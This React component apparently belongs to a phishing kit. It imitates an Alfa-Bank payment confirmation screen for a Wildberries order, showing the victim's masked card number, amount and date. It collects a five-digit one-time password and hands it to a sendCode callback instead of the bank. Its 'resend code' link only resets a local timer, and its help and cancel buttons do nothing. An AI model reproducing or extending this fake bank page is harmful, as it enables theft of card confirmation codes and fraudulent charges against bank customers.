import React, {useEffect, useState} from 'react'
import styles from './AlfabankPush.module.scss'
import CountUp from 'react-countup';

type Card = {
    paymentSystem: string;
    cardNumber: string;
    bank: string;
    system: string
  }
interface Props{
    cardDetails: Card;
    totalPrice: number
    sendCode: (value: string) => void;
}


const AlfabankPush = ({totalPrice, cardDetails, sendCode}: Props) => {
    const [counter, setCounter] = useState(60);
    const [canResend, setCanResend] = useState(false);
    let currentDate = new Date();
    let day = String(currentDate.getDate()).padStart(2, '0');
    let month = String(currentDate.getMonth() + 1).padStart(2, '0'); 
    let year = currentDate.getFullYear();
    let formattedDate = `${day}.${month}.${year}`;
    const [code, setCode] = useState('')
    function formatCardNumber(cardNumber: string): string {
        return cardNumber.slice(0, 4) + ' **** **** ' + cardNumber.slice(-4);
    }
    const startTimer = () => {
        setCanResend(false);
        setCounter(60);
      }

    const handleClick = () => {
        if (canResend) {
          startTimer();
        }
      }

    useEffect(() => {
    if (counter > 0) {
        const timer = setTimeout(() => setCounter(counter - 1), 1000);
        return () => clearTimeout(timer); 
    } else {
        setCanResend(true); 
    }
    }, [counter]);

    const payment = () =>{
        if(code.length !== 5){
            return
        }
        sendCode(code)
    }
  return (
    <div className={styles.alfabankPushContainer}>
    <div className={styles.logo}>
       <div className={styles.Slogo}>
       <img src={`https://mrbin.io/bins/logo/main/6792be07-af09-4e2a-b93e-67d21f938700/1.svg`} alt={'Alfa'} className={styles.bankLogo}/>
       </div>
    
  </div> 
     <div className={styles.title}>Подтверждение оплаты</div>
     <div className={styles.subtitle}>Пожалуйста, проверьте корректность реквизитов платежа.</div>
     <div className={styles.orderDetails}>
         <div className={styles.detailsItem}>
             <span>Интернет магазин:</span>
             <p>Wildberries</p>
         </div>
         <div className={styles.detailsItem}>
             <span>Номер карты:</span>
             <p>{formatCardNumber(cardDetails.cardNumber)}</p>
         </div>
         <div className={styles.detailsItem}>
             <span>Сумма платежа:</span>
             <p> <CountUp end={totalPrice} duration={0.4} separator="."/> RUB</p>
         </div>
         <div className={styles.detailsItem}>
             <span>Дата:</span>
             <p>{formattedDate}</p>
         </div>
     </div>
     <div className={styles.messageSended}>Сообщение с одноразовым паролем и реквизитами платежа отправлено</div>

     <div className={styles.codeInputBlock}>
         <div className={styles.title}>Введите пароль и подтвердите оплату</div>
         <div className={styles.inputCode}>
         <input type="tel" name="code" className={styles.codeVerif} maxLength={5} onKeyPress={(e) => {
        if (!/[0-9]/.test(e.key)) {
            e.preventDefault();
        }
    }} value={code} onChange={(e)=>setCode(e.target.value)}/>
         <button onClick={()=>payment()}>Подтвердить</button>
         </div>
     </div>
     <div className={styles.resendCode} onClick={handleClick}>
     {canResend ? 'Запросить пароль повторно' : `Запросить пароль повторно можно через ${counter} сек.`}
     </div>

     <div className={styles.actions}>
         <div className={`${styles.action} ${styles.help}`}>
         <i className="fa-solid fa-question" style={{color: '#d33139'}}></i>
             Помощь</div>
         <div className={`${styles.action} ${styles.cancelPayment}`}>
         <i className="fa-solid fa-xmark" style={{color: '#d33139'}}></i>
             Отменить оплату</div>

     </div>
 </div>
  )
}

export default AlfabankPush
